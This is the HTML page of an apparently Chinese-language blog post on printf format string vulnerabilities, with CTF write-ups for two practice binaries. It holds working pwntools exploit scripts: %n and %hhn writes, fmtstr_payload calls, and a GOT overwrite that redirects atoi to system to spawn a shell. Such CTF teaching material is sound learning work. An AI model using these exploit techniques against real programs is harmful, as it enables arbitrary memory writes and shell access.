@@ -1,0 +1,211 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>格式化字符串漏洞 | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="什么是格式化字符串漏洞当进行输出时，使用printf这类需要定义输出类型的函数时，未明确格式化字符的内容导致而产生的漏洞。 其中我们可以利用特殊的格式化字符来达到我们想要的目的，如：泄露地址，修改某个地址的值等 1234567%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数				--主要利用于泄露64位程序的地址%c - 字符 -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://example.com/2021/07/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="什么是格式化字符串漏洞当进行输出时，使用printf这类需要定义输出类型的函数时，未明确格式化字符的内容导致而产生的漏洞。 其中我们可以利用特殊的格式化字符来达到我们想要的目的，如：泄露地址，修改某个地址的值等 1234567%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数				--主要利用于泄露64位程序的地址%c - 字符 -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-07-26T04:12:57.000Z">
+<meta property="article:modified_time" content="2021-07-28T15:21:56.765Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/07/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-07-28 23:21:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">36</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">什么是格式化字符串漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A5%E7%BB%83%E4%BB%A3%E5%AD%A6%EF%BC%88gf-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">以练代学（gf-实时数据监测）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%A3%80%E6%9F%A5%E8%BF%90%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">checksec和检查运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80%E7%9A%84%E7%AE%97%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">关于偏移地址的算法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A5%E7%BB%83%E4%BB%A3%E5%AD%A6%EF%BC%88buu-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN51%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">以练代学（buu-[第五空间2019 决赛]PWN51）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C"><span class="toc-number">3.1.</span> <span class="toc-text">Checksec和查看运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B"><span class="toc-number">3.2.</span> <span class="toc-text">利用IDA查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">3.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.4.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">一：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.6.</span> <span class="toc-text">二：</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">格式化字符串漏洞</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-07-26T04:12:57.000Z" title="Created 2021-07-26 12:12:57">2021-07-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-28T15:21:56.765Z" title="Updated 2021-07-28 23:21:56">2021-07-28</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="什么是格式化字符串漏洞"><a href="#什么是格式化字符串漏洞" class="headerlink" title="什么是格式化字符串漏洞"></a>什么是格式化字符串漏洞</h1><p>当进行输出时，使用printf这类需要定义输出类型的函数时，未明确格式化字符的内容导致而产生的漏洞。</p>
+<p>其中我们可以利用特殊的格式化字符来达到我们想要的目的，如：泄露地址，修改某个地址的值等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数				--主要利用于泄露64位程序的地址</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址						--只要利用于泄露32位地址的值</span><br><span class="line">%n - 到目前为止所写的字符数				--修改某个地址的值</span><br><span class="line">eg:#%10$hhn就相当于读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：</p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-250858.htm">原创]Pwn学习笔记：printf格式化字符串漏洞原理与利用-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a>（推荐）</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/207425.html">CTF| 格式化字符串漏洞 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
+<h1 id="以练代学（gf-实时数据监测）"><a href="#以练代学（gf-实时数据监测）" class="headerlink" title="以练代学（gf-实时数据监测）"></a>以练代学（gf-实时数据监测）</h1><h2 id="checksec和检查运行"><a href="#checksec和检查运行" class="headerlink" title="checksec和检查运行"></a>checksec和检查运行</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726135605685.png?raw=true" alt="image-20210726135605685.png"></p>
+<p>32位的程序，保护什么都没开。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726141205835.png?raw=true" alt="image-20210726141205835.png"></p>
+<p>我们发现程序让我们输入一次之后，会打印一次我们输入的内容，并且会返回一些数据。这里面疑似有泄露了一个地址。</p>
+<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726142818269.png?raw=true" alt="image-20210726142818269.png"></p>
+<p>当时我以为会有栈溢出漏洞，但其实是没有的。并且这里的imagemagic居然是封装的Printf函数。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726142857928.png?raw=true" alt="image-20210726142857928.png"></p>
+<p>发现这里的printf没有对格式化字符进行限制，所以存在格式化字符串漏洞。</p>
+<p>并且结合locker()函数我们可以得知，如果key == 35795746的话那么就可以get_shell了。</p>
+<p>那么我们就可以通过格式化字符串漏洞来修改key的值来get_shell.</p>
+<h2 id="关于偏移地址的算法"><a href="#关于偏移地址的算法" class="headerlink" title="关于偏移地址的算法"></a>关于偏移地址的算法</h2><p>我个人觉得现在最稳定的方法就是手动输入后检测：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入AAAA-%p-%p....输入较多的%p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726151044248.png?raw=true" alt="image-20210726151044248.png"></p>
+<p>我们可以发现这里的地址距离首地址相差了12个位置。</p>
+<p>利用gdb的话我现在还是领悟不到。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>法一：</p>
+<p>利用fmtstr_payload（偏移地址，{目标地址：最终要修改的值})</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; remote(&#39;111.200.241.244&#39;,56845)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;gf-5&#39;)</span><br><span class="line">elf &#x3D;ELF(&#39;.&#x2F;gf-5&#39;)</span><br><span class="line">key &#x3D; 0x0804a048</span><br><span class="line"></span><br><span class="line">system_plt&#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line">payload &#x3D; fmtstr_payload(12, &#123;key:35795746&#125;)</span><br><span class="line">p.sendline(payload)	</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>法二：<br>利用%n的定义，将某个地址的值修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; remote(&#39;111.200.241.244&#39;,56845)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;gf-5&#39;)</span><br><span class="line">elf &#x3D;ELF(&#39;.&#x2F;gf-5&#39;)</span><br><span class="line">key &#x3D; 0x0804a048</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;%35795746x&#39;+&#39;%16$n\x00&#39;+p32(0x0804A048) </span><br><span class="line">p.sendline(payload)	</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="以练代学（buu-第五空间2019-决赛-PWN51）"><a href="#以练代学（buu-第五空间2019-决赛-PWN51）" class="headerlink" title="以练代学（buu-[第五空间2019 决赛]PWN51）"></a>以练代学（buu-[第五空间2019 决赛]PWN51）</h1><h2 id="Checksec和查看运行"><a href="#Checksec和查看运行" class="headerlink" title="Checksec和查看运行"></a>Checksec和查看运行</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726151337804.png?raw=true" alt="image-20210726151337804.png"></p>
+<p>32位程序，并且开了NX和canary。</p>
+<p>相比上一题我们这一题开启了更多的保护</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726151432797.png?raw=true" alt="image-20210726151432797.png"></p>
+<p>运行之后发现这里开始有一次输入，并且会打印一次输入的内容。在进行第二次输入，最后回显结果。</p>
+<h2 id="利用IDA查看"><a href="#利用IDA查看" class="headerlink" title="利用IDA查看"></a>利用IDA查看</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726151610665.png?raw=true" alt="image-20210726151610665.png"></p>
+<p>我们在这里可以发现程序中自带system，它运行的条件就是要满足atoi(nptr)==dword_804c0044的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atoi（）函数：C 库函数 int atoi(const char *str) 把参数 str 所指向的字符串转换为一个整数（类型为 int 型）。</span><br><span class="line">eg: 字符串值 &#x3D; 98993489, 整型值 &#x3D; 98993489</span><br><span class="line">	字符串值 &#x3D; runoob.com, 整型值 &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>dword_804c0044是在Bss段的内容</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726151704325.png?raw=true" alt="image-20210726151704325.png"></p>
+<p>综上我们可以梳理一下解题的步骤：</p>
+<p>利用格式化字符串漏洞—-&gt;修改0x804c044bss段内的值，令其等于atoi(nptr)。</p>
+<p>注意：我们这里在send的时候需要str()一下内容。</p>
+<p>通过我们上述的算偏移量的算法，我们得出偏移量为10</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726152546540.png?raw=true" alt="image-20210726152546540.png"></p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27415)</span><br><span class="line"></span><br><span class="line">bss &#x3D; 0x804C044</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;your name:&#39;)</span><br><span class="line">payload &#x3D; fmtstr_payload(10,&#123;bss:0x1111&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;your passwd:&#39;)</span><br><span class="line">p.send(str(0x1111))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>这里不仅仅有我们写入的方法我还看到了其他两种很精妙的方法：</p>
+<p>法一：</p>
+<p>思路：利用格式化字符串改写atoi的got地址，将其改为system的地址，配合之后的输入，得*到shell。这种方法具有普遍性，也可以改写后面的函数的地址，拿到shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29517)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn51&#39;)</span><br><span class="line">atoi_got &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">system_plt&#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line">payload &#x3D; fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个方法真的很精妙，我们知道got表是在调用函数的时候就会从plt跳转到got表中的地址，也就是说我们劫持了got表的内容，使得程序强行进入system中get_shell。</p>
+<p>但为什么我们可以直接send（/bin/sh\x00）呢？</p>
+<p>这里其实我也不是很清楚，但这里我有两个猜想：</p>
+<h2 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726154139620.png?raw=true" alt="image-20210726154139620.png"></p>
+<p>我们可以看到在修改完之后我们就会进入第二次输入，这时候是不是输入的内容就是写到了system的地址内呢？—-个人觉得可能性比较小。</p>
+<p>二：在32位的程序中，我们知道参数的传递是通过栈传递的，那么这第二次的输入是不是就是在传参呢？然后因为get_shell了所以就终止了第二次的输入。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726154651354.png?raw=true" alt="image-20210726154651354.png"></p>
+<p>通过gdb发现第二种猜想的可能性比较大。</p>
+<h2 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;pwn5&#39;)</span><br><span class="line">addr &#x3D; 0x0804C044</span><br><span class="line">#地址，也就相当于可打印字符串，共16byte</span><br><span class="line">payload &#x3D; p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">#开始将前面输出的字符个数输入到地址之中，hhn是单字节输入，其偏移为10</span><br><span class="line">#%10$hhn就相当于读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中</span><br><span class="line">payload +&#x3D; &quot;%10$hhn%11$hhn%12$hhn%13$hhn&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">--这里为什么是0x10101010我其实也是疑惑的，我的理解是我们这里传进去的数据是通过%n的，那么我们前面的字符数是不是10呢？</span><br><span class="line">并且在32位里面，长度为4才是一个完整的32位空间（忽然无法描述），那也就是说我们给前面地址的值都是10，也就有了0x84c044&#x3D;&#x3D;0x10101010。</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里我们为什么要逐个的输入呢？</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210726155317622.png?raw=true" alt="image-20210726155317622.png"></p>
+<p>我们发现0x804c044的值是被传输了4字节</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/07/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">http://example.com/2021/07/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/27/BUU%E5%88%B7%E9%A2%98-1/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">”BUU刷题-1“</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/24/gf-stack-2/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">gf-stack_2</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script 